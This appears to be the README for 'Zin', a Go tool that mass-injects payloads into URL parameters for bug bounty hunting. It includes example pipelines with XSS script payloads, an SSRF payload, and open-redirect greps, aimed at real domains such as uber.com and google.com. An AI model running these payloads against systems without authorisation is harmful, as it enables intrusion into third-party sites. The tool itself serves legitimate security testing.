![alt text](https://upload.wikimedia.org/wikipedia/commons/9/9a/Filled_Syringe_icon.svg)
##### Version 1.0

# Zin
**A Payload Injector for bugbounties written in go**



[![Image from Gyazo](https://i.gyazo.com/16031ae21e5b98c9c936de492be4cccf.gif)](https://gyazo.com/16031ae21e5b98c9c936de492be4cccf)

### Features

- Inject multiple payloads into all parameters
- Inject single payloads into all parameters
- Saves responses into output folder
- Displays Status Code & Response Length
- Can grep for patterns in the response
- Really fast
- Easy to setup


### New Features
- Pattern Matching in responses
- Match Status Codes

### Arguments
```
      _
     (_)
  _____ _ __
 |_  / | '_ \
  / /| | | | |
 /___|_|_| |_|


May the bounties come


  -c int
        the concurrency (default 20)
  -g string
        grep the response for any matches
  -p string
        the payload to be used
  -pL string
        the list of payloads to be used
  -s int
        filter by status codes (default 200)
        
```


### Install

`$ git clone https://github.com/ethicalhackingplayground/Zin && cd Zin && go build`



##### SSRF Example
`$ subfinder uber.com | gau | grep "=http" | ./Zin -c 80 -p http://10.82.214.84:31386/foobar.js -g "SUP3R_S3cret_1337_K3y"`

##### XSS Example

`$ subfinder uber.com | gau| ./Zin -c 80 -p '"><script>alert(matchforthis)script>' -g "matchforthis"`


##### Inject Multiple Payloads
`$ cat hosts | gau | grep "&" | ./Zin -c 80 -pL <payloadfile>`

##### Subdomain Scanning

`$ subfinder -dL domains --silent | gau | ./Zin -c 80 -p <payload>`


##### Only Test Parameters

`$ echo "google.com" | gau | grep "&" | ./Zin -c 80 -p '"><script>alert(document.domain)</script<"'`

##### Multiple Hosts

`$ cat hosts | gau | ./Zin -c 80 -p <payload>`

##### Grepping for Patterns

`$ cat output/responses.txt | grep -Hrie "Location: evil.com"`

##### Detecting Process

`$ cat output/responses.txt | grep -Hrie "Location: evil.com"`

`$ cat output/responses.txt | grep -Hrie "<script>alert(document.domain></script>"`

**If you get a bounty please support by buying me a coffee**

<a href="https://www.buymeacoffee.com/krypt0mux" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;" ></a>

